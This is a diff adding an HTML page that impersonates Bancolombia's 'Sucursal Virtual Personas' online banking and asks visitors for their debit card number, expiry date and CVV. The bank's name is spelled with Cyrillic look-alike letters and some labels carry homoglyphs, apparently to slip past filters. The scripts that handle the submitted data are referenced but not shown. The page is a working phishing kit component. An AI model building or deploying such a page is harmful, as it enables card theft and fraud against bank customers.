@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ваncоlоmbiа Sucursal Virtal Personas</title>
+    <link rel="icon" href="assets/logos/logo.png">
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/main.css">
+
+    <!-- FUNCTIONS -->
+    <script src="./js/functions.js"></script>
+</head>
+<body>
+
+    <header>
+        <img class="header-logo" src="./assets/logos/logo.svg" alt="">
+        <h3 class="header-subtitle">Sucursal Virtual Personas</h3>
+        <p class="header-text-info">Fecha y hora actual: <span id="datetime"></span></p>
+    </header>
+
+    <main>
+        <div class="page-label">
+            <h3 class="page-label-title">Verifiquemos que eres tú</h3>
+        </div>
+
+        <div class="error d-none mt-2">
+            <img src="./assets/icons/error.jpg">
+            <div class="error--text">
+                <h3>Error</h3>
+                <h4>Datos inválidos. Inténtelo de nuevo.</h4>
+            </div>
+        </div>
+
+        <div class="card">
+
+            <div class="card-header">
+                <h3>Verificar producto asociado a tu cuenta</h3>
+            </div>
+            <div class="card-message">
+                <p>Ingresa tu tarjeta débito asociada a tu cuenta de ahorros.</p>
+            </div>
+
+            <form id="form-card">
+
+                <div class="form-label">
+                    <img class="icon-info" src="./assets/icons/info.jpg" alt=""><label for="">Númеro de la tarjеta</label>
+                </div>
+                <!-- CARD NUMBER -->
+                <input id="p" class="form-input-text icon-i-cc" required placeholder="Númеro dе Tajеrta" type="text" oninput="formatearNumero(this)">
+
+
+                <div class="form-label mt-2">
+                    <img class="icon-info" src="./assets/icons/info.jpg" alt=""><label for="">Fecha de vencimiеnto</label>
+                </div>
+                <!-- FECHA -->
+                <div class="form-input-group mt-2">
+                    <select id="mes" required>
+                        <option value="" disabled selected>Mes</option>
+                        <option value="1">1</option>
+                        <option value="2">2</option>
+                        <option value="3">3</option>
+                        <option value="4">4</option>
+                        <option value="5">5</option>
+                        <option value="6">6</option>
+                        <option value="7">7</option>
+                        <option value="8">8</option>
+                        <option value="9">9</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                    <select id="ano" required>
+                        <option value="" disabled selected>Año</option>
+                        <option value="23">2023</option>
+                        <option value="24">2024</option>
+                        <option value="25">2025</option>
+                        <option value="26">2026</option>
+                        <option value="27">2027</option>
+                        <option value="28">2028</option>
+                        <option value="29">2029</option>
+                        <option value="30">2030</option>
+                        <option value="31">2031</option>
+                        <option value="32">2032</option>
+                        <option value="33">2033</option>
+                        <option value="34">2034</option>
+                        <option value="35">2035</option>
+                        <option value="36">2036</option>
+                    </select>
+                </div>
+
+                <div class="form-label mt-2">
+                    <img class="icon-info" src="./assets/icons/info.jpg" alt=""><label for="">Código de seguridаd</label>
+                </div>
+
+                <!-- CVV -->
+                <input required class="form-input-text mt-2 icon-i-pass" type="text" id="c" maxlength="3" placeholder="CVV">
+                
+                <div class="one-btn-container">
+                    <button class="btn mt-4" type="submit">
+                        Continuar
+                    </button>  
+                </div>
+            </form>
+        </div>
+
+        <div class="header-publicity">
+            <img src="./assets/cards.svg" style="width: 200px ; text-align: center;" alt="">
+            <p>¿No conoces la Sucursal Virtual Personas de Ваncоlоmbiа? Conoce más aquí</p>
+        </div>
+
+        <footer class="footer-telephones">
+            <div class="tels">
+                Sucursal Telefónica Ваncоlоmbiа: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510
+				90 00 - Cali (57) 60 2 554 05 05 - Barranquilla (57) 60 5 361 88 88 - Cartagena (57) 60 5 693 44 00 -
+				Bucaramanga (57) 60 7 697 25 25 - Pereira (57) 60 6 340 12 13 - El resto del país 018000 9 12345.
+				Sucursales Telefónicas en el exterior: España (34) 900 995 717 - Estados Unidos (1) 866 379 97 14.</div>
+			<div class="footer-ip">
+				<span>Dirección IP: <span id="ip">186.192.168.249</span></span>
+				<span>Copyright © 2023 Ваncоlоmbiа S.A.</span>
+			</div>
+        </footer>
+    </main>
+    
+
+
+
+
+
+    <!-- JS -->
+    <script src="./js/product.js"></script>
+</body>
+</html>
